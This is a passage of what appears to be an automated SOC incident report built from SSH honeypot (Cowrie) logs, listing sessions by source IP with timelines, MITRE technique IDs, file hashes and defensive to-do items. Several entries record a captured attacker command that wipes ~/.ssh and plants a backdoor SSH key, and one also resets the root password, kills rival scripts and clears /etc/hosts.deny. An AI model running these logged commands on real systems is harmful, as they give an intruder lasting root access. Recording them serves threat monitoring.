| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:37:36` | `cowrie.session.connect` |
| `2026-06-08 04:37:36` | `cowrie.client.version` |
| `2026-06-08 04:37:36` | `cowrie.client.kex` |
| `2026-06-08 04:37:36` | `cowrie.login.success` |
| `2026-06-08 04:37:37` | `cowrie.session.params` |
| `2026-06-08 04:37:37` | `cowrie.command.input` |
| `2026-06-08 04:37:37` | `cowrie.command.failed` |
| `2026-06-08 04:37:37` | `cowrie.log.closed` |
| `2026-06-08 04:37:37` | `cowrie.session.params` |
| `2026-06-08 04:37:37` | `cowrie.command.input` |
| `2026-06-08 04:37:37` | `cowrie.session.file_download` |
| `2026-06-08 04:37:37` | `cowrie.log.closed` |
| `2026-06-08 04:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9896c76e1f4c

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:37 |
| **Last Seen** | 2026-06-08 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:37:39` | `cowrie.session.connect` |
| `2026-06-08 04:37:39` | `cowrie.client.version` |
| `2026-06-08 04:37:39` | `cowrie.client.kex` |
| `2026-06-08 04:37:40` | `cowrie.login.success` |
| `2026-06-08 04:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8458d2d14ee3

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:42 |
| **Last Seen** | 2026-06-08 04:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:42:32` | `cowrie.session.connect` |
| `2026-06-08 04:42:32` | `cowrie.client.version` |
| `2026-06-08 04:42:32` | `cowrie.client.kex` |
| `2026-06-08 04:42:33` | `cowrie.login.success` |
| `2026-06-08 04:42:33` | `cowrie.session.params` |
| `2026-06-08 04:42:33` | `cowrie.command.input` |
| `2026-06-08 04:42:33` | `cowrie.command.failed` |
| `2026-06-08 04:42:34` | `cowrie.log.closed` |
| `2026-06-08 04:42:34` | `cowrie.session.params` |
| `2026-06-08 04:42:34` | `cowrie.command.input` |
| `2026-06-08 04:42:34` | `cowrie.session.file_download` |
| `2026-06-08 04:42:34` | `cowrie.log.closed` |
| `2026-06-08 04:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22717df51915

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:42 |
| **Last Seen** | 2026-06-08 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:42:36` | `cowrie.session.connect` |
| `2026-06-08 04:42:36` | `cowrie.client.version` |
| `2026-06-08 04:42:36` | `cowrie.client.kex` |
| `2026-06-08 04:42:37` | `cowrie.login.success` |
| `2026-06-08 04:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dd7eccc2d1a

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:57 |
| **Last Seen** | 2026-06-08 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:57:31` | `cowrie.session.connect` |
| `2026-06-08 04:57:31` | `cowrie.client.version` |
| `2026-06-08 04:57:32` | `cowrie.client.kex` |
| `2026-06-08 04:57:32` | `cowrie.login.success` |
| `2026-06-08 04:57:32` | `cowrie.session.params` |
| `2026-06-08 04:57:32` | `cowrie.command.input` |
| `2026-06-08 04:57:32` | `cowrie.command.failed` |
| `2026-06-08 04:57:33` | `cowrie.log.closed` |
| `2026-06-08 04:57:33` | `cowrie.session.params` |
| `2026-06-08 04:57:33` | `cowrie.command.input` |
| `2026-06-08 04:57:33` | `cowrie.session.file_download` |
| `2026-06-08 04:57:33` | `cowrie.log.closed` |
| `2026-06-08 04:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ea516ef86c

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 04:57 |
| **Last Seen** | 2026-06-08 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 04:57:35` | `cowrie.session.connect` |
| `2026-06-08 04:57:35` | `cowrie.client.version` |
| `2026-06-08 04:57:35` | `cowrie.client.kex` |
| `2026-06-08 04:57:36` | `cowrie.login.success` |
| `2026-06-08 04:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3c879a6d0c

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 05:02 |
| **Last Seen** | 2026-06-08 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 05:02:31` | `cowrie.session.connect` |
| `2026-06-08 05:02:31` | `cowrie.client.version` |
| `2026-06-08 05:02:31` | `cowrie.client.kex` |
| `2026-06-08 05:02:32` | `cowrie.login.success` |
| `2026-06-08 05:02:32` | `cowrie.session.params` |
| `2026-06-08 05:02:32` | `cowrie.command.input` |
| `2026-06-08 05:02:32` | `cowrie.command.failed` |
| `2026-06-08 05:02:32` | `cowrie.log.closed` |
| `2026-06-08 05:02:33` | `cowrie.session.params` |
| `2026-06-08 05:02:33` | `cowrie.command.input` |
| `2026-06-08 05:02:33` | `cowrie.session.file_download` |
| `2026-06-08 05:02:33` | `cowrie.log.closed` |
| `2026-06-08 05:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f76cc82aa6

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 05:02 |
| **Last Seen** | 2026-06-08 05:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 05:02:35` | `cowrie.session.connect` |
| `2026-06-08 05:02:35` | `cowrie.client.version` |
| `2026-06-08 05:02:35` | `cowrie.client.kex` |
| `2026-06-08 05:02:35` | `cowrie.login.success` |
| `2026-06-08 05:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35a3446097f7

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 05:07 |
| **Last Seen** | 2026-06-08 05:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 05:07:35` | `cowrie.session.connect` |
| `2026-06-08 05:07:35` | `cowrie.client.version` |
| `2026-06-08 05:07:35` | `cowrie.client.kex` |
| `2026-06-08 05:07:35` | `cowrie.login.success` |
| `2026-06-08 05:07:36` | `cowrie.session.params` |
| `2026-06-08 05:07:36` | `cowrie.command.input` |
| `2026-06-08 05:07:36` | `cowrie.command.failed` |
| `2026-06-08 05:07:36` | `cowrie.log.closed` |
| `2026-06-08 05:07:36` | `cowrie.session.params` |
| `2026-06-08 05:07:36` | `cowrie.command.input` |
| `2026-06-08 05:07:36` | `cowrie.session.file_download` |
| `2026-06-08 05:07:36` | `cowrie.log.closed` |
| `2026-06-08 05:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef6edda0d474

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 05:07 |
| **Last Seen** | 2026-06-08 05:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 05:07:38` | `cowrie.session.connect` |
| `2026-06-08 05:07:38` | `cowrie.client.version` |
| `2026-06-08 05:07:38` | `cowrie.client.kex` |
| `2026-06-08 05:07:39` | `cowrie.login.success` |
| `2026-06-08 05:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b794be69918d

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 05:12 |
| **Last Seen** | 2026-06-08 05:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 05:12:34` | `cowrie.session.connect` |
| `2026-06-08 05:12:34` | `cowrie.client.version` |
| `2026-06-08 05:12:35` | `cowrie.client.kex` |
| `2026-06-08 05:12:35` | `cowrie.login.success` |
| `2026-06-08 05:12:35` | `cowrie.session.params` |
| `2026-06-08 05:12:35` | `cowrie.command.input` |
| `2026-06-08 05:12:35` | `cowrie.command.failed` |
| `2026-06-08 05:12:36` | `cowrie.log.closed` |
| `2026-06-08 05:12:36` | `cowrie.session.params` |
| `2026-06-08 05:12:36` | `cowrie.command.input` |
| `2026-06-08 05:12:36` | `cowrie.session.file_download` |
| `2026-06-08 05:12:36` | `cowrie.log.closed` |
| `2026-06-08 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62dd14ebbdd8

| Field | Detail |
|---|---|
| **Source IP** | `118.33.113[.]91` |
| **First Seen** | 2026-06-08 05:12 |
| **Last Seen** | 2026-06-08 05:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 05:12:38` | `cowrie.session.connect` |
| `2026-06-08 05:12:38` | `cowrie.client.version` |
| `2026-06-08 05:12:38` | `cowrie.client.kex` |
| `2026-06-08 05:12:39` | `cowrie.login.success` |
| `2026-06-08 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.33.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.33.113[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6ac06ca95b7

| Field | Detail |
|---|---|
| **Source IP** | `43.160.200[.]19` |
| **First Seen** | 2026-06-08 06:00 |
| **Last Seen** | 2026-06-08 06:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 06:00:01` | `cowrie.session.connect` |
| `2026-06-08 06:00:01` | `cowrie.client.version` |
| `2026-06-08 06:00:01` | `cowrie.client.kex` |
| `2026-06-08 06:00:02` | `cowrie.login.success` |
| `2026-06-08 06:00:02` | `cowrie.session.params` |
| `2026-06-08 06:00:02` | `cowrie.command.input` |
| `2026-06-08 06:00:02` | `cowrie.command.failed` |
| `2026-06-08 06:00:02` | `cowrie.log.closed` |
| `2026-06-08 06:00:02` | `cowrie.session.params` |
| `2026-06-08 06:00:02` | `cowrie.command.input` |
| `2026-06-08 06:00:02` | `cowrie.session.file_download` |
| `2026-06-08 06:00:02` | `cowrie.log.closed` |
| `2026-06-08 06:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.200[.]19` to AbuseIPDB if not already reported
- [ ] Block `43.160.200[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0cb5200b7c

| Field | Detail |
|---|---|
| **Source IP** | `43.160.200[.]19` |
| **First Seen** | 2026-06-08 06:00 |
| **Last Seen** | 2026-06-08 06:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 06:00:04` | `cowrie.session.connect` |
| `2026-06-08 06:00:04` | `cowrie.client.version` |
| `2026-06-08 06:00:04` | `cowrie.client.kex` |
| `2026-06-08 06:00:04` | `cowrie.login.success` |
| `2026-06-08 06:00:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.200[.]19` to AbuseIPDB if not already reported
- [ ] Block `43.160.200[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe0c1961d0b8

| Field | Detail |
|---|---|
| **Source IP** | `67.241.132[.]98` |
| **First Seen** | 2026-06-08 06:32 |
| **Last Seen** | 2026-06-08 06:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 06:32:58` | `cowrie.session.connect` |
| `2026-06-08 06:32:58` | `cowrie.client.version` |
| `2026-06-08 06:32:58` | `cowrie.client.kex` |
| `2026-06-08 06:32:59` | `cowrie.login.success` |
| `2026-06-08 06:32:59` | `cowrie.session.params` |
| `2026-06-08 06:32:59` | `cowrie.command.input` |
| `2026-06-08 06:32:59` | `cowrie.command.failed` |
| `2026-06-08 06:33:00` | `cowrie.log.closed` |
| `2026-06-08 06:33:00` | `cowrie.session.params` |
| `2026-06-08 06:33:00` | `cowrie.command.input` |
| `2026-06-08 06:33:00` | `cowrie.session.file_download` |
| `2026-06-08 06:33:00` | `cowrie.log.closed` |
| `2026-06-08 06:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.241.132[.]98` to AbuseIPDB if not already reported
- [ ] Block `67.241.132[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a6ff4a4d9dd

| Field | Detail |
|---|---|
| **Source IP** | `67.241.132[.]98` |
| **First Seen** | 2026-06-08 06:33 |
| **Last Seen** | 2026-06-08 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 06:33:03` | `cowrie.session.connect` |
| `2026-06-08 06:33:03` | `cowrie.client.version` |
| `2026-06-08 06:33:03` | `cowrie.client.kex` |
| `2026-06-08 06:33:04` | `cowrie.login.success` |
| `2026-06-08 06:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `67.241.132[.]98` to AbuseIPDB if not already reported
- [ ] Block `67.241.132[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-797a4f94d1a3

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]14` |
| **First Seen** | 2026-06-08 06:58 |
| **Last Seen** | 2026-06-08 06:58 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:x1cd6GRVapBD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
